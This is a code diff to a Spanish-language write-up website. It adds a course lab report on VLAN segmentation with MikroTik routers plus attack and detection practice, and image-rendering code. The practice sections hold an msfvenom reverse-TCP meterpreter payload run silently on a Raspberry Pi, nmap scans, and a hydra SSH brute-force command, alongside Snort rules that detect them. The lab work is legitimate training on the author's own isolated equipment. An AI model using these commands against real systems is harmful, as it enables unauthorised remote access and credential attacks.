@@ -37,6 +37,9 @@ article pre code{padding:0;background:none}
 article li{margin:.2em 0}
 footer{margin-top:40px;color:var(--muted);font-size:.85rem}
 .back{display:inline-block;margin-top:24px}
+article figure{margin:1em 0}
+article figure img{max-width:100%;height:auto;border:1px solid var(--line);border-radius:8px;display:block}
+article figcaption{color:var(--muted);font-size:.85rem;margin-top:6px}
 .hidden{display:none}
 </style>
 </head>
@@ -65,6 +68,131 @@ footer{margin-top:40px;color:var(--muted);font-size:.85rem}
 /* ===== AÑADE TUS INFORMES AQUÍ =====
    id: solo letras, números y guiones. content: Markdown sencillo. */
 var WRITEUPS = [
+{
+ id:"laboratorio-enrutado-vlan", date:"2026-05-25", category:"Laboratorios",
+ title:"Segmentación de red con VLAN y enrutado entre MikroTik, con prácticas de ataque y detección",
+ summary:"Red enrutada y segmentada con dos MikroTik, un switch D-Link, un servidor Fedora, Kali y una Raspberry Pi; incluye explotación, pivoting, mapeo de puertos y detección con Snort.",
+ tags:["MikroTik","VLAN 802.1Q","Firewall","Metasploit","Nmap","Hydra","Snort"],
+ content:[
+"## Objetivo",
+"Montar desde cero una red segmentada en VLAN, con enrutamiento entre varios equipos MikroTik y un servidor Linux como puerta de enlace, y usarla para practicar tanto ataque (explotación, pivoting, escaneo) como defensa (firewall, IDS). Laboratorio realizado en el curso de especialización en Ciberseguridad en entornos de las tecnologías de operación (OT), módulo Sistemas de Control Industrial Seguros, mayo de 2026.",
+"## Equipos y topología",
+"- **Servidor Fedora 36:** puerta de enlace a internet y servidor DHCP. Dos interfaces: una externa con IP por DHCP (zona firewalld `external`, con enmascaramiento/NAT activado) y una interna en 192.168.12.1/24 (zona `internal`, objetivo ACCEPT), hacia el router 1.",
+"- **Router 1 (MikroTik):** conecta con el Fedora por `ether1` y agrupa el resto de interfaces (ether2-4 y wlan1) en un bridge propio, con su DHCP y acceso WiFi.",
+"- **Router 2 (MikroTik):** cuelga del router 1 y es el que reparte la red en VLAN 31 y 32, con su propio firewall.",
+"- **Switch D-Link:** reparte las VLAN por puerto mediante 802.1Q.",
+"- **Kali Linux** (192.168.31.40): equipo atacante.",
+"- **Raspberry Pi** (192.168.31.39): equipo objetivo, con SSH y VNC.",
+"La cadena de enrutado queda: Fedora (12.1) → router 1 (12.2, bridge propio en 192.168.112.1) → router 2 (WAN en 192.168.112.2, LAN en 10.0.2.1 y VLAN 31/32) → switch → Kali / Raspberry.",
+"## Configuración del servidor Fedora",
+"- Interfaz externa: DHCP automático, con enmascaramiento activado en la zona `external` de firewalld (para compartir la salida a internet).",
+"- Interfaz interna (hacia el router 1): IP manual 192.168.12.1/24, zona `internal` con objetivo `ACCEPT`.",
+"- Servidor DHCP (`/etc/dhcp/dhcpd.conf`) para la red interna:",
+"```",
+"subnet 192.168.12.0 netmask 255.255.255.0 {",
+"  option routers 192.168.12.1;",
+"  option subnet-mask 255.255.255.0;",
+"  option domain-name \"g2.fe36.local\";",
+"  option domain-name-servers 8.8.8.8, 8.8.4.4;",
+"  range 192.168.12.20 192.168.12.40;",
+"}",
+"```",
+"## Configuración del router 1",
+"- `ether1` apunta al Fedora: se le dio inicialmente una IP fija (192.168.12.2/24) y más adelante se pasó a cliente DHCP, con DNS 8.8.8.8 y ruta por defecto hacia 192.168.12.1 a través de `ether1`.",
+"- Se creó un bridge (`bridge112`) agrupando el resto de interfaces (ether2, ether3, ether4 y wlan1), con IP propia 192.168.112.1/24.",
+"- Pool DHCP para ese bridge: 192.168.112.20-192.168.112.40, servido por un DHCP server enlazado a `bridge112`.",
+"- Se configuró también la red inalámbrica para poder acceder por WiFi además de por cable.",
+"## Configuración del router 2",
+"- Dos bridges: `bridgeWAN` (sube hacia el router 1, puerto raíz del spanning tree) y `bridgeLAN` (hacia el switch y los equipos).",
+"- `bridgeWAN`: IP estática 192.168.112.2/24 (en la red del `bridge112` del router 1), con ruta por defecto hacia 192.168.112.1 comprobada por ping (check-gateway).",
+"- `bridgeLAN`: IP 10.0.2.1/24.",
+"- Interfaces VLAN sobre `bridgeLAN`: `vlan31` (ID 31, 192.168.31.1/24) y `vlan32` (ID 32, 192.168.32.1/24).",
+"- Tres listas de interfaces para ordenar las reglas de firewall: `lans` (bridgeLAN), `vlans` (vlan31 y vlan32) y `wans` (bridgeWAN).",
+"- Tres servidores DHCP, uno por red (bridgeLAN, vlan31, vlan32), cada uno con su propio pool y 10 minutos de lease.",
+"- NAT: regla en la cadena `srcnat` con salida por `bridgeWAN` y acción `masquerade`, para dar salida a internet a toda la red.",
+"- Firewall (filter rules), en este orden:",
+"  1. Regla automática de fasttrack para conexiones `established` y `related`.",
+"  2. Accept entre `lans` y `wans` en ambos sentidos (LAN con salida a internet).",
+"  3. Accept entre `wans` y `vlans` en ambos sentidos (las VLAN también salen a internet).",
+"  4. Drop final en `forward` para todo el tráfico que entra desde `vlans` que no haya hecho match antes (bloquea VLAN↔VLAN y VLAN↔LAN).",
+"  5. Drop final en `input` para el tráfico desde `vlans` hacia el propio router (las VLAN no pueden administrar el router).",
+"  Resultado: las VLAN 31 y 32 salen a internet pero no se ven entre sí ni con la LAN ni con la gestión del router.",
+"## Configuración del switch",
+"- Conectado al router 2 por el puerto 8. Para el primer acceso se puso IP fija en el equipo de gestión (conectado al puerto 7); después el switch pasó a DHCP y se volvió a entrar por la IP que le asignó el MikroTik.",
+"- VLAN 802.1Q con Asymmetric VLAN activado. Configuración final por puerto:",
+"```",
+"VID 1  (default) -> untagged: eth7, eth8        tagged: eth1-eth6",
+"VID 31            -> untagged: eth1, eth2, eth3  tagged: eth7, eth8",
+"VID 32            -> untagged: eth4, eth5, eth6  tagged: eth7, eth8",
+"PVID: eth1-3=31 · eth4-6=32 · eth7-8=1",
+"```",
+"- En la práctica: los puertos 1 a 3 son de acceso para la VLAN 31, los puertos 4 a 6 de acceso para la VLAN 32, y los puertos 7 y 8 actúan como enlace troncal (tagged) hacia el router 2.",
+"## Configuración de los dispositivos finales",
+"- **Kali Linux:** instalación por cable (sin usar WiFi), seguida de `apt update && apt upgrade` y la instalación de un servidor VNC para acceso remoto.",
+"- **Raspberry Pi:** sistema grabado con Raspberry Pi Imager (Raspberry Pi 4), con personalización de hostname, usuario y autenticación SSH por contraseña habilitada desde el propio asistente. La IP asignada por DHCP (192.168.31.39) se localizó en los leases de Winbox y se comprobó el acceso por SSH. El VNC se activó después con `sudo raspi-config` → *System Options* → *VNC* → *Enable*, y se conectó con RealVNC Viewer.",
+"## Prácticas",
+"### 1. Exploits con Metasploit",
+"```",
+"systemctl start postgresql.service",
+"msfconsole",
+"nmap -sV -p21 192.168.31.39",
+"```",
+"El escaneo identificó **vsftpd 3.0.5**. Al ser una versión ya actualizada no se pudo explotar la vulnerabilidad que se esperaba, pero sí se localizó un aviso de seguridad sobre esa versión (CVE-2025-14242, denegación de servicio por desbordamiento al parsear el comando STAT).",
+"### 2. Vector de infección",
+"```",
+"msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.40 LPORT=4000 -f raw > vector.py",
+"sftp admin@192.168.31.39",
+"sftp> put vector.py",
+"```",
+"Con la carga generada en Kali, se subió a la Raspberry por SFTP. En Metasploit se configuró `exploit/multi/handler` con el payload `python/meterpreter/reverse_tcp`, LHOST y LPORT igual que en la carga. El primer intento falló al enlazar el puerto; al corregirlo quedó el listener activo (`Started reverse TCP handler on 0.0.0.0:4000`). Al ejecutar `vector.py` en la Raspberry se abrió sesión de **meterpreter** sobre el objetivo, de forma silenciosa para el usuario del equipo.",
+"### 3. Mapeo de puertos con Nmap",
+"Batería de escaneos desde Kali, con resultados reales de la red del laboratorio:",
+"```",
+"nmap 192.168.31.39              # objetivo directo: 22/ssh, 5900/vnc",
+"nmap 192.168.31.1 192.168.31.39 192.168.31.40   # multiobjetivo (router, raspberry, el propio kali)",
+"nmap 192.168.31.1/24            # escaneo de subred: 256 direcciones, 3 equipos activos",
+"nmap 192.168.31.20-40           # escaneo de rango",
+"nmap -sV 192.168.31.39          # versiones: OpenSSH 8.0, VNC protocolo 3.8",
+"nmap -sA 192.168.31.39          # comprobación de firewall: todos los puertos sin filtrar",
+"nmap -sP 192.168.31.*           # descubrimiento de equipos activos",
+"nmap -F 192.168.31.39           # escaneo rápido",
+"```",
+"Un escaneo adicional a 192.168.12.1 (el Fedora, en la otra punta de la cadena de enrutado) mostró que el tráfico llegaba correctamente a través de los dos routers, confirmando que el enrutamiento entre redes funcionaba de extremo a extremo.",
+"### 4. Detección y prevención con Snort",
+"Se prepararon tres scripts en Kali, usando `crunch` para generar diccionarios sencillos y `hydra` para el ataque de prueba:",
+"```",
+"# crear_usuarios",
+"crunch 2 2 -t @@ -o usuarios.txt",
+"",
+"# crear_claves",
+"crunch 2 2 -t @% -o claves.txt",
+"",
+"# lanzar_hydra (con la IP cambiada por la de la Raspberry antes de ejecutarlo)",
+"hydra -L usuarios.txt -P claves.txt -o resultados.txt -t 4 -I ssh://192.168.31.39:22",
+"```",
+"Antes de atacar se comprobó el objetivo con `ping` y `nmap`. En la Raspberry se instaló Snort (`apt install snort`), indicando como red local 192.168.31.0/24, y se añadió un fichero de reglas propio:",
+"```",
+"# /etc/snort/rules/custom.rules",
+"alert icmp any any -> $HOME_NET any (msg:\"Tráfico ICMP!!\"; sid:30000001;)",
+"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:\"Entrando SSH\"; flags:S; sid:30000002;)",
+"```",
+"Se incluyó `custom.rules` en `/etc/snort/snort.conf` y se reinició el servicio (`systemctl restart snort`). El objetivo de lanzar Hydra no era comprometer la cuenta, sino generar tráfico SSH de prueba para comprobar la detección: en el log de Snort (`/var/log/snort`) aparecieron tanto los pings como cada intento de conexión SSH, clasificados como *Detection of a Network Scan*.",
+"## Resultados",
+"- Red funcional segmentada en VLAN, con DHCP por segmento, acceso remoto por SSH y VNC, y enrutamiento verificado de extremo a extremo (Fedora → router 1 → router 2 → switch → equipos).",
+"- Las VLAN 31 y 32 quedaron aisladas entre sí y respecto a la LAN y a la gestión del router, pero con salida a internet, como se buscaba.",
+"- vsftpd 3.0.5, por estar actualizado, no fue explotable con el exploit esperado; sí expuesto a un DoS conocido de esa versión.",
+"- Sesión de meterpreter obtenida sobre la Raspberry mediante una carga ejecutada en el propio objetivo.",
+"- Snort, con dos reglas propias, detectó correctamente el tráfico ICMP y los intentos de conexión SSH generados durante la prueba con Hydra.",
+"## Lecciones aprendidas",
+"- Mantener los servicios actualizados reduce de forma real la superficie de ataque: fue el motivo concreto por el que no se pudo explotar vsftpd.",
+"- Separar la red en VLAN y ordenar las reglas de firewall por listas de interfaces hace el diseño mucho más legible y fácil de auditar que tener reglas sueltas por IP.",
+"- El orden de las reglas de firewall importa tanto como su contenido: el aislamiento entre VLAN no vino de una regla explícita de bloqueo VLAN↔VLAN, sino de dejar sin cubrir ese tráfico antes del drop final.",
+"- Un IDS como Snort solo detecta lo que se le indica en sus reglas: sin la regla personalizada para el puerto 22, los intentos de SSH habrían pasado desapercibidos.",
+"## Nota ética",
+"Todas las pruebas se realizaron sobre equipos propios, en una red de laboratorio aislada y con fines formativos."
+].join("\n")
+},
+
 {
  id:"plantilla-pentest", template:true, date:"2026-11-01", category:"Pentesting",
  title:"Pentest a una máquina vulnerable (plantilla)",
@@ -95,29 +223,6 @@ var WRITEUPS = [
 "## Lecciones aprendidas",
 "Qué harías distinto y qué has aprendido."
 ].join("\n")
-},
-{
- id:"plantilla-segmentacion-ot", template:true, date:"2026-10-15", category:"OT/ICS",
- title:"Laboratorio de segmentación IT/OT (plantilla)",
- summary:"Plantilla de informe KT para documentar el diseño y la validación de una red segmentada.",
- tags:["IEC 62443","VLAN","Firewall"],
- content:[
-"## Objetivo",
-"Qué problema resuelve el laboratorio y qué se quería demostrar.",
-"## Arquitectura",
-"Incluye aquí un diagrama de red: zonas, conductos, firewall y direccionamiento.",
-"- **Zona IT:** servicios corporativos",
-"- **DMZ industrial:** servidores de intercambio",
-"- **Zona OT:** PLC y SCADA",
-"## Configuración",
-"Reglas de firewall y VLAN relevantes, explicadas por qué existen.",
-"## Validación",
-"Pruebas realizadas para comprobar que el tráfico no permitido se bloquea.",
-"## Relación con IEC 62443",
-"Qué requisitos de zonas y conductos cubre el diseño.",
-"## Lecciones aprendidas",
-"Limitaciones del laboratorio y siguientes pasos."
-].join("\n")
 }
 ];
 
@@ -131,6 +236,9 @@ function md(src){
       out.push(inCode?"</code></pre>":"<pre><code>");inCode=!inCode;return}
     if(inCode){out.push(esc(l));return}
     var m;
+    if((m=l.match(/^!\[(.*)\]\((img\/[A-Za-z0-9._-]+)\)$/))){
+      if(inList){out.push("</ul>");inList=false}
+      out.push("<figure><img src=\""+m[2]+"\" alt=\""+esc(m[1])+"\" loading=\"lazy\"><figcaption>"+esc(m[1])+"</figcaption></figure>");return}
     if((m=l.match(/^(#{2,3}) (.*)/))){
       if(inList){out.push("</ul>");inList=false}
       out.push("<h"+m[1].length+">"+inline(m[2])+"</h"+m[1].length+">");return}
